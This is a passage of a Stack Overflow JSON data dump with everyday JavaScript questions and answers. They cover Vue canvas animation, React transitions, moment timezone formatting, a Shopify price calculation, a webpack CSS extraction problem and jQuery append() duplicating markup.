"https://i.stack.imgur.com/0z3Z8.png?s=128&g=1", "display_name": "Bryan", "link": "https://stackoverflow.com/users/1784018/bryan"}, "edited": false, "score": 0, "creation_date": 1558562499, "post_id": 56264529, "comment_id": 99147407, "body": "It may not know what <code>context</code> is because it is defined within the scope of your mounted function and not passed into the draw function."}, {"owner": {"reputation": 995, "user_id": 6437335, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/b1e29f44c7cffacfb1b32c6746f85c27?s=128&d=identicon&r=PG&f=1", "display_name": "Edon", "link": "https://stackoverflow.com/users/6437335/edon"}, "reply_to_user": {"reputation": 795, "user_id": 1784018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0z3Z8.png?s=128&g=1", "display_name": "Bryan", "link": "https://stackoverflow.com/users/1784018/bryan"}, "edited": false, "score": 0, "creation_date": 1558562553, "post_id": 56264529, "comment_id": 99147419, "body": "@Bryan thanks! I&#39;m not getting any errors, and it draws the figure, it just doesn&#39;t animate the arm"}, {"owner": {"reputation": 795, "user_id": 1784018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0z3Z8.png?s=128&g=1", "display_name": "Bryan", "link": "https://stackoverflow.com/users/1784018/bryan"}, "edited": false, "score": 0, "creation_date": 1559062451, "post_id": 56264529, "comment_id": 99298726, "body": "Can you clarify if your draw function is a computed property or a method?"}], "answers": [{"tags": [], "owner": {"reputation": 795, "user_id": 1784018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0z3Z8.png?s=128&g=1", "display_name": "Bryan", "link": "https://stackoverflow.com/users/1784018/bryan"}, "is_accepted": true, "score": 1, "last_activity_date": 1559064360, "last_edit_date": 1559064360, "creation_date": 1559063871, "answer_id": 56347240, "question_id": 56264529, "link": "https://stackoverflow.com/questions/56264529/animate-canvas-from-vue/56347240#56347240", "title": "Animate Canvas from Vue", "body": "<p>Here's an example of how this might look in a component.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>Vue.component('canvas-demo', {\r\n    data: function () {\r\n        return {\r\n            timestamp: Date.now(),\r\n            wave: false\r\n        }\r\n    },\r\n    mounted: function(){\r\n        this.startDrawing(this.$el.getContext(\"2d\"));\r\n    },\r\n    template: '&lt;canvas&gt;&lt;/canvas&gt;',\r\n    methods: {\r\n        startDrawing: function(context) {\r\n            var draw = () =&gt; {\r\n                if (Date.now() &lt; (this.timestamp + 900)) return requestAnimationFrame(draw);\r\n\r\n                context.clearRect(0, 0, window.innerWidth, window.innerHeight);\r\n                context.beginPath();\r\n                context.fillStyle = \"black\"; // #000000\r\n                context.arc(200, 50, 30, 0, Math.PI * 2, true);\r\n                context.fill(); //fill the circle  \r\n\r\n                context.beginPath();\r\n                context.lineWidth = 6;\r\n                context.stroke();\r\n\r\n                //body\r\n                context.beginPath();\r\n                context.moveTo(200, 80);\r\n                context.lineTo(200, 180);\r\n                context.strokeStyle = \"black\";\r\n                context.stroke();\r\n\r\n                //arms\r\n                context.beginPath();\r\n                context.strokeStyle = \"black\";\r\n                context.moveTo(200, 100);\r\n                context.lineTo(150, 130);\r\n                if (this.wave) {\r\n                    context.moveTo(200, 100);\r\n                    context.lineTo(250, 130);\r\n                    this.wave = false;\r\n                }\r\n                else {\r\n                    context.moveTo(200, 100);\r\n                    context.lineTo(250, 70);\r\n                    this.wave = true;\r\n                }\r\n                context.stroke();\r\n\r\n                //legs\r\n                context.beginPath();\r\n                context.strokeStyle = \"black\";\r\n                context.moveTo(200, 180);\r\n                context.lineTo(150, 280);\r\n                context.moveTo(200, 180);\r\n                context.lineTo(250, 280);\r\n                context.stroke();\r\n                this.timestamp = Date.now();\r\n                requestAnimationFrame(draw);\r\n            }\r\n\r\n            draw();\r\n        }\r\n    }\r\n});\r\n\r\nnew Vue({\r\n    el: '#app'\r\n});</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.js\"&gt;&lt;/script&gt;\r\n\r\n&lt;div id=\"app\"&gt;\r\n    &lt;canvas-demo&gt;&lt;/canvas-demo&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 995, "user_id": 6437335, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/b1e29f44c7cffacfb1b32c6746f85c27?s=128&d=identicon&r=PG&f=1", "display_name": "Edon", "link": "https://stackoverflow.com/users/6437335/edon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1121, "favorite_count": 0, "accepted_answer_id": 56347240, "answer_count": 1, "score": 1, "last_activity_date": 1559064360, "creation_date": 1558556871, "question_id": 56264529, "link": "https://stackoverflow.com/questions/56264529/animate-canvas-from-vue", "title": "Animate Canvas from Vue", "body": "<p>I am trying to implement <a href=\"https://stackoverflow.com/a/49119527/6437335\">this post</a>, which draws and animates a stick figure, into Vue.</p>\n\n<pre><code>   draw(timestamp, wave) {\n        if(Date.now() &lt; (timestamp+900)) return requestAnimationFrame(this.draw);\n\n        context.clearRect(0, 0, window.innerWidth, window.innerHeight);\n        context.beginPath();\n        context.fillStyle = \"black\"; // #000000\n        context.arc(200, 50, 30, 0, Math.PI * 2, true);\n        context.fill(); //fill the circle  \n\n        context.beginPath(); \n        context.lineWidth = 6;\n        context.stroke();\n\n        //body\n        context.beginPath();\n        context.moveTo(200, 80);\n        context.lineTo(200, 180);\n        context.strokeStyle = \"black\";\n        context.stroke();\n\n        //arms\n        context.beginPath();\n        context.strokeStyle = \"black\";\n        context.moveTo(200, 100);\n        context.lineTo(150, 130);\n        if(wave) { \n        context.moveTo(200, 100);\n        context.lineTo(250, 130);\n        wave = false;\n        }\n        else {\n        context.moveTo(200, 100);\n        context.lineTo(250, 70);\n        wave = true;\n        }\n        context.stroke();\n\n        //legs\n        context.beginPath();\n        context.strokeStyle = \"black\";\n        context.moveTo(200, 180);\n        context.lineTo(150, 280);\n        context.moveTo(200, 180);\n        context.lineTo(250, 280);\n        context.stroke();\n        timestamp = Date.now();\n        requestAnimationFrame(this.draw);\n    }\n},\nmounted: function () {\n    var canvas = document.getElementById(\"canvas\");\n    context = canvas.getContext(\"2d\"); // get Canvas Context object\n    let timestamp = Date.now();\n    let wave = false;\n\n    this.draw(timestamp, wave);\n}\n</code></pre>\n\n<p>If I do the entire draw method inside of my <code>mounted</code> method, it works. But when I move draw to it's own method, as shown above, it fails. </p>\n\n<p>I know it's failing because the line <code>if(Date.now() &lt; (timestamp+900))</code> is always returning false when running the code above. But I'm not sure why that's happening, or what the difference is.</p>\n\n<p>How can I get this canvas to animate?</p>\n"}, {"tags": ["javascript", "reactjs"], "owner": {"reputation": 3851, "user_id": 48405, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5bb39b467c75124367de8d87f03e9f9?s=128&d=identicon&r=PG", "display_name": "Joe Attardi", "link": "https://stackoverflow.com/users/48405/joe-attardi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 218, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558556667, "creation_date": 1558556667, "question_id": 56264490, "link": "https://stackoverflow.com/questions/56264490/how-to-animate-a-react-component-as-it-is-destroyed", "title": "How to animate a React component as it is destroyed?", "body": "<p>I have a simple Notifications component which renders an array of Notification components. I would like to have the notifications fade in and out. So I installed <code>react-transition-group</code> and gave it a try. </p>\n\n<p>I can't quite get it to work, though. When a new notification is added, it does fade in, but when a notification is removed, it simply disappears - it does not fade out.</p>\n\n<p>Here's what I have:</p>\n\n<p>Component:</p>\n\n<pre><code>export default function Notifications({ notifications }) {\n  return (\n    &lt;NotificationsContainer style={{ top: 'calc(100% - ' + (4.5 * notifications.length) + 'em)'}}&gt;\n      &lt;TransitionGroup className=\"notifications\"&gt;\n        {[...notifications].reverse().map(notification =&gt; (\n          &lt;CSSTransition key={notification.timestamp} timeout={500} classNames=\"notification\"&gt;\n            &lt;Notification emoji={notification.emoji} /&gt;\n          &lt;/CSSTransition&gt;\n        ))}\n      &lt;/TransitionGroup&gt;\n    &lt;/NotificationsContainer&gt;\n  );\n}\n</code></pre>\n\n<p>CSS:</p>\n\n<pre class=\"lang-css prettyprint-override\"><code>  .notification-enter {\n    opacity: 0;\n  }\n\n  .notification-enter-active {\n    opacity: 1;\n    transition: opacity 0.5s ease-in;\n  }\n\n  .notification-exit {\n    opacity: 1;\n  }\n\n  .notification-exit-active {\n    opacity: 0;\n    transition: opacity 0.5s ease-in;\n  }\n</code></pre>\n"}, {"tags": ["javascript", "datetime", "timezone", "momentjs"], "comments": [{"owner": {"reputation": 2721, "user_id": 1614862, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/dbc73ea0a6bc58a1b5a15b1edc50fcc0?s=128&d=identicon&r=PG", "display_name": "user1614862", "link": "https://stackoverflow.com/users/1614862/user1614862"}, "edited": false, "score": 0, "creation_date": 1558556930, "post_id": 56264460, "comment_id": 99145444, "body": "I tried this, moment(&#39;2019-05-18T19:30:00-0700&#39;).format(&#39;DD/MM/YYYY h:mm A zz&#39;) which is displaying it like 18/05/2019 7:30 PM, but no timezone value"}, {"owner": {"reputation": 24465, "user_id": 4131048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d7fa62a0a8d08d01ae848ea7fdee8e9?s=128&d=identicon&r=PG&f=1", "display_name": "VincenzoC", "link": "https://stackoverflow.com/users/4131048/vincenzoc"}, "edited": false, "score": 0, "creation_date": 1558565642, "post_id": 56264460, "comment_id": 99148188, "body": "If you want to use plain JavaScript, have a look at <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toLocaleString\" rel=\"nofollow noreferrer\"><code>toLocaleString()</code></a>. If you want to use moment, have a look at <a href=\"http://momentjs.com/timezone/\" rel=\"nofollow noreferrer\">moment-timezone</a>, you could have something like: <code>moment.tz(&#39;2019-05-18T19:30:00-0400&#39;, &#39;America&#47;New_York&#39;).format(&#39;MM&#47;DD&#47;YYYY hh:mm A zz&#39;)</code>.  See also <a href=\"https://stackoverflow.com/q/40494995/4131048\">this question</a>."}, {"owner": {"reputation": 2721, "user_id": 1614862, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/dbc73ea0a6bc58a1b5a15b1edc50fcc0?s=128&d=identicon&r=PG", "display_name": "user1614862", "link": "https://stackoverflow.com/users/1614862/user1614862"}, "reply_to_user": {"reputation": 24465, "user_id": 4131048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d7fa62a0a8d08d01ae848ea7fdee8e9?s=128&d=identicon&r=PG&f=1", "display_name": "VincenzoC", "link": "https://stackoverflow.com/users/4131048/vincenzoc"}, "edited": false, "score": 0, "creation_date": 1558571517, "post_id": 56264460, "comment_id": 99149269, "body": "I do not know timezone (America/New_York) details when I get date string. It can be any date with any offset 2019-05-18T19:30:00+0100, if I use toLocaleString(), it is converting it to browser&#39;s timezone, not to the timezone that represents in date string."}], "answers": [{"tags": [], "owner": {"reputation": 195413, "user_id": 634824, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/889cf720c96957e615463b5c903a5e18?s=128&d=identicon&r=PG", "display_name": "Matt Johnson-Pint", "link": "https://stackoverflow.com/users/634824/matt-johnson-pint"}, "is_accepted": true, "score": 0, "last_activity_date": 1558627560, "creation_date": 1558627560, "answer_id": 56279137, "question_id": 56264460, "link": "https://stackoverflow.com/questions/56264460/convert-iso-utc-date-to-local-by-displaying-timezone-javascript-momentjs/56279137#56279137", "title": "Convert ISO/UTC date to local by displaying timezone javascript/momentjs", "body": "<p>It is impossible to determine a time zone from an offset alone.  There are many offsets that belong to more than one time zone.  Thus rendering an abbreviation is impossible.</p>\n\n<p>See <a href=\"https://stackoverflow.com/tags/timezone/info\">Time Zone != Offset</a> in the timezone tag wiki for further details, and refer to the <a href=\"https://en.wikipedia.org/wiki/List_of_tz_database_time_zones\" rel=\"nofollow noreferrer\">list of tz database time zones</a> if you would like examples.</p>\n\n<p>However, from your comments it appears you that you would also like to keep the same local time and offset as you are given.  Moment can help with that part, using its (inappropriately named) <code>parseZone</code> function:</p>\n\n<pre><code>moment.parseZone(\"2019-05-18T19:30:00+0100\").format(\"MM/DD/YYYY hh:mm A ZZ\")\n//=&gt; \"05/18/2019 07:30 PM +0100\"\n</code></pre>\n"}], "owner": {"reputation": 2721, "user_id": 1614862, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/dbc73ea0a6bc58a1b5a15b1edc50fcc0?s=128&d=identicon&r=PG", "display_name": "user1614862", "link": "https://stackoverflow.com/users/1614862/user1614862"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 56279137, "answer_count": 1, "score": 0, "last_activity_date": 1558627560, "creation_date": 1558556543, "last_edit_date": 1558571574, "question_id": 56264460, "link": "https://stackoverflow.com/questions/56264460/convert-iso-utc-date-to-local-by-displaying-timezone-javascript-momentjs", "title": "Convert ISO/UTC date to local by displaying timezone javascript/momentjs", "body": "<p>I have a date in the format like 2019-05-18T19:30:00-0400 which I need to display as <strong>05/18/2019 07:30 PM EST</strong> using momentjs or plain javascript. I tried several ways, for example, moment(new Date('2019-05-18T19:30:00-0400')).format('MM-DD-YYYY h:mm A zz')</p>\n"}, {"tags": ["javascript", "html", "shopify"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 11533672, "user_type": "registered", "profile_image": "https://graph.facebook.com/10219229533507928/picture?type=large", "display_name": "Alexander Kr&#252;ger", "link": "https://stackoverflow.com/users/11533672/alexander-kr%c3%bcger"}, "edited": false, "score": 0, "creation_date": 1558589160, "post_id": 56264974, "comment_id": 99152345, "body": "This to not seems to work. It must be taken into account that it is a variant product that changes the price according to one&#39;s choice. <a href=\"https://imgur.com/a/GsIjdNm\" rel=\"nofollow noreferrer\">imgur.com/a/GsIjdNm</a>"}, {"owner": {"reputation": 392, "user_id": 7044855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8853c5bb96a922687efac6e58c25bf0?s=128&d=identicon&r=PG", "display_name": "prieber", "link": "https://stackoverflow.com/users/7044855/prieber"}, "reply_to_user": {"reputation": 1, "user_id": 11533672, "user_type": "registered", "profile_image": "https://graph.facebook.com/10219229533507928/picture?type=large", "display_name": "Alexander Kr&#252;ger", "link": "https://stackoverflow.com/users/11533672/alexander-kr%c3%bcger"}, "edited": false, "score": 0, "creation_date": 1558636024, "post_id": 56264974, "comment_id": 99175929, "body": "Is it possible to provide a link to the page?  I&#39;d like to do a bit of testing before updating my answer."}, {"owner": {"reputation": 1, "user_id": 11533672, "user_type": "registered", "profile_image": "https://graph.facebook.com/10219229533507928/picture?type=large", "display_name": "Alexander Kr&#252;ger", "link": "https://stackoverflow.com/users/11533672/alexander-kr%c3%bcger"}, "edited": false, "score": 0, "creation_date": 1558775725, "post_id": 56264974, "comment_id": 99217916, "body": "Yes, this is the URL: <a href=\"https://www.sengefabriksudsalg.dk/collections/kontinental-senge/products/nordkap-kontinental-pocket-180x200-cm\" rel=\"nofollow noreferrer\">sengefabriksudsalg.dk/collections/kontinental-senge/products&zwnj;&#8203;/&hellip;</a> I have postet the answer :-)"}], "tags": [], "owner": {"reputation": 392, "user_id": 7044855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8853c5bb96a922687efac6e58c25bf0?s=128&d=identicon&r=PG", "display_name": "prieber", "link": "https://stackoverflow.com/users/7044855/prieber"}, "is_accepted": false, "score": 2, "last_activity_date": 1558559448, "last_edit_date": 1558559448, "creation_date": 1558558924, "answer_id": 56264974, "question_id": 56264457, "link": "https://stackoverflow.com/questions/56264457/shopify-product-price-divided-by-10/56264974#56264974", "title": "Shopify product price divided by 10", "body": "<p><code>price.replace</code> is going to give you a string, which cannot be divided (hence <code>NaN</code>).</p>\n\n<p>Try this:</p>\n\n<pre><code>var price = parseInt($('#price-field').text().replace(',00 DKK',''))\n// snipped...\n$('.grafikr-finans-price-10').text(price/10).toFixed(1)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 11533672, "user_type": "registered", "profile_image": "https://graph.facebook.com/10219229533507928/picture?type=large", "display_name": "Alexander Kr&#252;ger", "link": "https://stackoverflow.com/users/11533672/alexander-kr%c3%bcger"}, "is_accepted": false, "score": 0, "last_activity_date": 1558775688, "creation_date": 1558775688, "answer_id": 56303423, "question_id": 56264457, "link": "https://stackoverflow.com/questions/56264457/shopify-product-price-divided-by-10/56303423#56303423", "title": "Shopify product price divided by 10", "body": "<p>This work :-) </p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;script&gt;\r\n$(document).ready(function() {\r\n  function setprice() {\r\n  \r\n   \tvar price = $('#price-field').text().replace(',00 DKK','')\r\n    for (i = 0; i &lt; $('.grafikr-finans-price').length; i++) {\r\n    \t$('.grafikr-finans-price').text(price)\r\n    }\r\n    $('.grafikr-finans-price-10').html(\r\n      ((parseInt(price.replace('.','')) / 20).toFixed(1) + '0 kr.').replace('.',',')\r\n    );\r\n  }\r\n  \r\n  setprice()\r\n  \r\n  $('.sod_option').click(function() {\r\n    setTimeout(function() {\r\n      setprice()\r\n    }, 500)\r\n  \r\n  }); \r\n\t\r\n});\r\n&lt;/script&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 1, "user_id": 11533672, "user_type": "registered", "profile_image": "https://graph.facebook.com/10219229533507928/picture?type=large", "display_name": "Alexander Kr&#252;ger", "link": "https://stackoverflow.com/users/11533672/alexander-kr%c3%bcger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1558775688, "creation_date": 1558556533, "last_edit_date": 1558558003, "question_id": 56264457, "link": "https://stackoverflow.com/questions/56264457/shopify-product-price-divided-by-10", "title": "Shopify product price divided by 10", "body": "<p>I have previously made a financing calculator, so you can see the price if you pay over 10 months. An update has arrived in Shopify, which blocks my scripts.</p>\n\n<pre><code>monthly payment &lt;span class=\"grafikr-finans-price-10\"&gt;{{ product.price | divided_by: 10 | money }}&lt;/span&gt;&lt;/p&gt;\n\n$('.grafikr-finans-price-10').text(((price.replace('.','')/10).toFixed(1) + '0 kr.').replace('.',','))\n</code></pre>\n\n<p>Anyone know how to fix the problem? \nYou can se the problem here:<a href=\"https://imgur.com/Y4k9amz\" rel=\"nofollow noreferrer\">https://imgur.com/Y4k9amz</a></p>\n\n<p>You can see the full script here:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;script&gt;\r\n$(document).ready(function() {\r\n  function setprice() {\r\n  \r\n    \t  var price = $('#price-field').text().replace(',00 DKK','')\r\n    for (i = 0; i &lt; $('.grafikr-finans-price').length; i++) {\r\n    \t$('.grafikr-finans-price').text(price + ' kr.')\r\n    }\r\n    \t$('.grafikr-finans-price-10').text(((price.replace('.','')/10).toFixed(1) + '0 kr.').replace('.',','))\r\n  }\r\n  \r\n  setprice()\r\n  \r\n  $('.sod_option').click(function() {\r\n    setTimeout(function() {\r\n      setprice()\r\n    }, 500)\r\n  \r\n  }); \r\n\r\n});\r\n&lt;/script&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": ["javascript", "node.js", "reactjs", "webpack", "ecmascript-6"], "comments": [{"owner": {"reputation": 1772, "user_id": 5706630, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaa1a2b46f07dc520e9bf47c760c1d3e?s=128&d=identicon&r=PG&f=1", "display_name": "Roy.B", "link": "https://stackoverflow.com/users/5706630/roy-b"}, "edited": false, "score": 0, "creation_date": 1561273406, "post_id": 56264413, "comment_id": 100004082, "body": "how did you solve it?"}, {"owner": {"reputation": 2360, "user_id": 2167740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c08242928bb45b2574c9e698d045aec5?s=128&d=identicon&r=PG", "display_name": "Drops", "link": "https://stackoverflow.com/users/2167740/drops"}, "edited": false, "score": 0, "creation_date": 1592469754, "post_id": 56264413, "comment_id": 110438216, "body": "I don&#39;t think <code>mini-css-extract-plugin</code> works with <code>target: &#39;node&#39;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 1772, "user_id": 5706630, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaa1a2b46f07dc520e9bf47c760c1d3e?s=128&d=identicon&r=PG&f=1", "display_name": "Roy.B", "link": "https://stackoverflow.com/users/5706630/roy-b"}, "edited": false, "score": 0, "creation_date": 1561273611, "post_id": 56269273, "comment_id": 100004125, "body": "I tried it, didn&#39;t work for me, no css file was created in the build folder, any other advice?"}, {"owner": {"reputation": 14359, "user_id": 11487196, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4493b1f4bc88550d52d4556bc74c096?s=128&d=identicon&r=PG&f=1", "display_name": "Tony Ngo", "link": "https://stackoverflow.com/users/11487196/tony-ngo"}, "reply_to_user": {"reputation": 1772, "user_id": 5706630, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaa1a2b46f07dc520e9bf47c760c1d3e?s=128&d=identicon&r=PG&f=1", "display_name": "Roy.B", "link": "https://stackoverflow.com/users/5706630/roy-b"}, "edited": false, "score": 2, "creation_date": 1561274197, "post_id": 56269273, "comment_id": 100004221, "body": "Did you include css file in your js ?"}], "tags": [], "owner": {"reputation": 14359, "user_id": 11487196, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4493b1f4bc88550d52d4556bc74c096?s=128&d=identicon&r=PG&f=1", "display_name": "Tony Ngo", "link": "https://stackoverflow.com/users/11487196/tony-ngo"}, "is_accepted": false, "score": 1, "last_activity_date": 1558593219, "creation_date": 1558593219, "answer_id": 56269273, "question_id": 56264413, "link": "https://stackoverflow.com/questions/56264413/minicssextractplugin-is-not-creating-css-file/56269273#56269273", "title": "MiniCssExtractPlugin is not creating css file", "body": "<p>Check my below config </p>\n\n<pre><code>const MiniCssExtractPlugin = require(\"mini-css-extract-plugin\");\n\nmodule.exports = {\n    plugins: [\n        new MiniCssExtractPlugin({\n            filename: \"[name].css\",\n            chunkFilename: \"[id].css\"\n        }),\n   ],\n    module: {\n        rules: [{\n                test: /\\.scss$/,\n                use: [\n                    'style-loader',\n                    MiniCssExtractPlugin.loader,\n                    {\n                        loader: \"css-loader\",\n                        options: {\n                            minimize: true,\n                            sourceMap: true\n                        }\n                    },\n                    {\n                        loader: \"sass-loader\"\n                    }\n                ]\n            }\n        ]\n    }\n</code></pre>\n\n<p>Please let me know if you still have problem</p>\n"}], "owner": {"reputation": 181, "user_id": 6003249, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/81b58bd1e7a4d2a94248bf02796bf06d?s=128&d=identicon&r=PG&f=1", "display_name": "JasonA", "link": "https://stackoverflow.com/users/6003249/jasona"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1801, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1570719090, "creation_date": 1558556373, "last_edit_date": 1570719090, "question_id": 56264413, "link": "https://stackoverflow.com/questions/56264413/minicssextractplugin-is-not-creating-css-file", "title": "MiniCssExtractPlugin is not creating css file", "body": "<p>I'm implementing server side rendering with React/Node and CSS Modules are no longer working. </p>\n\n<p>I've brought in mini-css-extract-plugin to extract the CSS from the JS and the plugin is not creating a css file in the public folder (or anywhere).</p>\n\n<p>/package.json</p>\n\n<pre><code>{\n  ....\n  \"main\": \"webpack.config.js\",\n  \"scripts\": {\n    \"server\": \"babel-node ./src/server/index.js\",\n    \"client\": \"webpack --watch --progress\",\n    \"start\": \"yarn server &amp; yarn client\"\n  },\n  ...\n  \"devDependencies\": {\n    \"@babel/cli\": \"^7.4.4\",\n    \"@babel/core\": \"^7.4.0\",\n    \"@babel/node\": \"^7.4.5\",\n    \"@babel/plugin-proposal-class-properties\": \"^7.4.0\",\n    \"@babel/plugin-syntax-dynamic-import\": \"^7.2.0\",\n    \"@babel/preset-env\": \"^7.4.2\",\n    \"@babel/preset-react\": \"^7.0.0\",\n    \"@babel/register\": \"^7.4.4\",\n    \"babel-loader\": \"^8.0.5\",\n    \"babel-plugin-css-modules-transform\": \"^1.6.2\",\n    \"css-loader\": \"^2.1.1\",\n    \"mini-css-extract-plugin\": \"^0.6.0\",\n    \"react-frontload\": \"^1.0.7\",\n    \"react-loadable\": \"^5.5.0\",\n    \"webpack\": \"^4.29.6\",\n    \"webpack-cli\": \"^3.3.0\",\n    \"webpack-node-externals\": \"^1.7.2\"\n  }\n}\n</code></pre>\n\n<p>/webpack.config.js</p>\n\n<pre><code>const path = require('path');\nconst MiniCssExtractPlugin = require('mini-css-extract-plugin');\nmodule.exports = {\n  mode: 'production',\n  entry: './src/client/index.js',\n  target: 'node',\n  output: {\n    path: path.resolve(__dirname, 'public'),\n    filename: 'build.js',\n    publicPath: '/',\n  },\n  resolve: {extensions: ['.js', '.css']},\n  watch: false,\n  plugins: [new MiniCssExtractPlugin({filename: 'styles.css'})],\n  module: {\n    rules: [\n      {\n        test: /\\.css$/,\n        sideEffects: true,\n        use: [{loader: MiniCssExtractPlugin.loader}, 'css-loader'],\n      },\n      {\n        test: /\\.js?$/,\n        loader: 'babel-loader',\n        exclude: /node_modules/,\n        options: {\n          cacheDirectory: true\n        }\n      }\n    ]\n  }\n}\n</code></pre>\n\n<p>/.babelrc</p>\n\n<pre><code>{\n    \"presets\": [\"@babel/env\", \"@babel/react\"],\n    \"plugins\": [\n        \"@babel/plugin-syntax-dynamic-import\",\n        \"@babel/plugin-proposal-class-properties\",\n        [\"css-modules-transform\", {\n          \"generateScopedName\": \"[name]__[local]___[hash:base64:5]\"\n        }]\n    ]\n}\n</code></pre>\n\n<p>I expect to see the following file be created /public/styles.css and right now no file is being created in that folder or anywhere else. Thanks for your help!</p>\n"}, {"tags": ["javascript", "jquery", "html"], "comments": [{"owner": {"reputation": 67968, "user_id": 584192, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YBSIc.png?s=128&g=1", "display_name": "Samuel Liew", "link": "https://stackoverflow.com/users/584192/samuel-liew"}, "edited": false, "score": 0, "creation_date": 1558570266, "post_id": 56264395, "comment_id": 99149072, "body": "Comments are not for extended discussion; this conversation has been <a href=\"https://chat.stackoverflow.com/rooms/193799/discussion-on-question-by-shaun-chander-why-is-append-adding-markup-multiple-t\">moved to chat</a>."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 10152661, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wJU4i.jpg?s=128&g=1", "display_name": "Shaun Chander", "link": "https://stackoverflow.com/users/10152661/shaun-chander"}, "is_accepted": false, "score": 0, "last_activity_date": 1558670992, "creation_date": 1558670992, "answer_id": 56285767, "question_id": 56264395, "link": "https://stackoverflow.com/questions/56264395/why-is-append-adding-markup-multiple-times-as-opposed-to-just-once/56285767#56285767", "title": "Why is append() adding markup multiple times as opposed to just once?", "body": "<p>So after tedious work and testing, I found out that the issue was actually with the slider, Siema, which actually duplicates the markup and adds it back into the <code>siema-home</code> div. Another issue was with using <code>width: 100%</code> with Siema, which causes the slider to break and display the extra-slides it created side-by-side with the markup appended by the <code>append()</code> function.</p>\n\n<p>TLDR: This was an issue with the slider and the fix was to edit the width from 100% to a smaller value or used a definite pixel value. </p>\n"}], "owner": {"reputation": 1, "user_id": 10152661, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wJU4i.jpg?s=128&g=1", "display_name": "Shaun Chander", "link": "https://stackoverflow.com/users/10152661/shaun-chander"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558670992, "creation_date": 1558556318, "last_edit_date": 1558558129, "question_id": 56264395, "link": "https://stackoverflow.com/questions/56264395/why-is-append-adding-markup-multiple-times-as-opposed-to-just-once", "title": "Why is append() adding markup multiple times as opposed to just once?", "body": "<p>I'm using jQuery's append() and the forEach() function to map through an array of objects, displaying the data to a slideshow. Although the array has one object in it, the resulting markup has extra data, essentially the append() method is appending the same markup 2x or more times. </p>\n\n<p>I've tried to remove the markup and instead replace it with \"Hello World\" (no tags) and it renders correctly. However, when I input \"Hello World\", it will be appending 3 times as opposed to once. I've console.logged the array to ensure that it only contains one object before and during the forEach() method and can confirm that there is only one element in the array, therefore this is an issue with append()</p>\n\n<pre><code>$.getJSON(\n            `${window.location.origin}/public/js/config/shopCards.json`,\n            function(res) {\n                var featuredItems = res.filter(function(item) {\n                    return item.isFeatured;\n                });\n\n                if (featuredItems.length === 0) {\n                    $('.featured-items').empty();\n                    return;\n                }\n\n                console.log(featuredItems, featuredItems);\n\n                featuredItems.forEach(function(item) {\n                    console.log(item);\n                    $('.siema-home').append(`       \n        &lt;div class=\"card card-shop home-card ${\n                        item.isExclusive ? 'exclusive' : ''\n                    } ${item.isOnSale ? 'sale' : ''} 